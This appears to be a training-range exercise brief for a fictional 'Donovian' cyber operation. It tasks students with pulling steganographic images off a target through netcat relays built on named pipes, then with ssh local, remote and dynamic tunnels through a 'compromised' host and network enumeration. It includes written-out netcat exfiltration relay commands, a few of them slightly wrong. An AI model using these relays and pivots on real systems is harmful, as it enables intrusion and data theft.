Donovian Tunnels and Collection (DTC)
XX OCT 2023
Start Time: 1300
Duration: 4 hours

Type of Operation: Reconnaissance, Tunneling, and Data Collection

Objective: You have been provided intel in regards to colecting key intelligence and sensitive data from Donovian Cyberspace, move and redirect all data back to your INTERNET_HOST. To aid in completion of this mission Gorgas cyber forces have provided your team access to the various systems in order to test and develop your technical code, with the intent of providing this for use during a future mission being executed by their cyber forces. Outlined below are three tasks that the regional COCOM Commander has laid out tasking for your team to provide support for and demonstrate successful functionality of these capabilities. You will be required to utilize previously learned and practiced skills to assist in reconnaissance and enumeration of these environments.

Scenario Credentials: FLAG = move_your_body_body

------------------------------------------------------------------------------------------------------------------------------

Task 1 Netcat Relay

Objective: You have been provided intel in regards to colecting key intelligence and sensitive data from Donovian Cyberspace, move and redirect all data back to your INTERNET-HOST. A Donovian Insider has stashed important information in the form of JPG images on T2. Each JPG image contains a piece of the message in the form of Steganography. Utilizing Netcat relays, you will use the designated RELAY to transfer the JPG images to your INTERNET-HOST. Once the images are downloaded you will use a command-line tool called steghide to extract the message.

Utilize the targets T1, T2, and RELAY to develop the following netcat relays for use by Gorgan Cyber Forces. The use of names pipes should be utilized on RELAY:

    The Donovian Insider provided a image called 1steg.jpg on T2 and is trying to connect to RELAY on TCP port 1234 to send the file. Establish a Netcat relay on RELAY to accept this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.

    The Donovian Insider provided a image called 2steg.jpg on T2 and is trying to connect to RELAY on TCP port 4321 to send the file. Establish a Netcat relay on RELAY to accept this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.

    The Donovian Insider provided a image called 3steg.jpg on T2 listening for a connection from RELAY on TCP port 6789. Establish a Netcat relay on RELAY to make this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.

    The Donovian Insider provided a image called 4steg.jpg on T2 listening for a connection from RELAY on TCP port 9876. Establish a Netcat relay on RELAY to make this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.

    Use the syntax: steghide extract -sf [image name] to extract the hidden message. Use password when prompted for a passphrase.


------------------------------------------------------------------------------------------------------------------------------

Task 2 Tunnels Prep

Untilizing the corresponding Task 2 Tunnels Prep start question, when the start flag in inputted, it will open up 20 simple questions all worth 5 points each. Please answer these questions before continuing on to Task 3.

-------------------------------------------------------------------------------------------------------------------------------

Task 3 Tunnel Training

Utilize the targets T3, and T4 to develop ssh tunneling capabilities for use by Gorgan Cyber Forces:

They have provided three practice challenges to get you started.

T3 is your designated initial Pivot from your INTERNET_HOST

When creating tunnels your authorized port ranges to utilize are:
NssXX
N = Net Number (1-4)
ss = Student Number (01-99)
XX = Selected port Number (00-99)

e.g. :
net-1, student 1, port forward 1 = 10101
net-2, student 1, port forward 2 = 20102
net-3, student 10, port forward 5 = 31005
net-4, student 12, port forward 10 = 41210
net-5, student 14, port forward 15 = 51415

    Create valid ssh Local Port Forward to leverage for follow-on actions

    Create valid ssh Remote Port Forward to leverage for follow-on actions

    Create valid ssh Dynamic Port Forward to leverage for follow-on actions

To help validate these technical capabilities Gorgan Cyber Forces have established a training range and have placed various flags within. As you successfully develop capabilities your team will find associated flags to validate they work.


------------------------------------------------------------------------------------------------------------------------------

Task 4 Data Collection
You are tasked to provide support for Gorgan Cyber Forces operating within Donovian Cyberspace. Utilizing all capabilities and skills developed, interact with the provided target T5 entry point and enumerate their network and systems.

Document all actions taken, intelligence gathered, and all other diagrams and evidence collected during each task for review by Mission Command

Tools/Techniques: Netcat (nc), Secure Shell (ssh), /dev/tcp, and any others you may require

Prior Approvals: Successfully develop valid netcat sessions as outlined, upon completion of Task 1, authorization from Mission Command (Instructor) is required to start Task 2. Once all techniques have been demonstrated, you will be granted authority to interact with systems throughout Donovian Cyberspace.

------------------------------------------------------------------------------------------------------------------------------

Scheme of Maneuver:
Task 1
```shell
#INTERNET_HOST (T1)
sudo nc 172.16.40.10 5555 > 1steg.jpg

#BLUE_INT_DMZ_HOST-1 172.16.40.10 (RELAY)
nc -lvp 1234 <fifopipe | nc -lvp 5555 > fifopipe
nc -lvp 4321 <fifopipe | nc -lvp 5555 > fifopipe


nc 172.16.82.115 6789 <fifopipe | nc -lvp 5555 > fifopipe

nc 172.16.82.115 9876 <fifopipe | nc -lvp 5555 > fifopipe
#BLUE_HOST-4 172.16.82.115 (T2)

nc -lvp 172.16.40.10 1234 < 1steg.png
```


Task 2
> INTERNET_HOST (T1)
→ T3
→ T4


Task 3
> INTERNET_HOST (T1)
→ T5

------------------------------------------------------------------------------------------------------------------------------

Target Section:

Task 1

T1
Hostname: INTERNET_HOST
External IP: 10.50.XXX.XXX (ALREADY PROVIDED) Internal IP: 10.10.0.40 (ALREADY PROVIDED) (accessed via FLOAT IP)
creds: (ALREADY PROVIDED)
Action: Successfully transfer file data between hosts via Netcat

T2
Hostname: BLUE_HOST-4
IP: 172.16.82.115
creds: (NONE)
Action: Successfully transfer files from this host using Netcat

RELAY
Hostname: BLUE_INT_DMZ_HOST-1
IP: 172.16.40.10
creds: (ALREADY PROVIDED)
Action: Successfully transfer file data between hosts via Netcat


Task 3

T3
Hostname: Atropia
IP: 10.50.XXX.XXX (Will be Provided by Mission Command)
creds: netY_studentX:passwordX (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
Known Ports: 22(ssh)
Action: Establish appropriate tunneling techniques

T4
Hostname: Pineland
IP: 10.50.XXX.XXX (Will be Provided by Mission Command)
creds: netY_studentX:passwordX (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
Known Ports: 23(telnet - go directly from T1 to T4 to simulate compromising the machine)
Type: Compromised Donovian System
Action: Establish appropriate tunneling techniques


Task 4
T5
Hostname: UNKNOWN
IP: 10.50.XXX.XXX (Will be Provided by Mission Command)
creds: netY_studentX:passwordX (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
Known Ports: UNKNOWN
Action: Execute proper movement and redirection techniques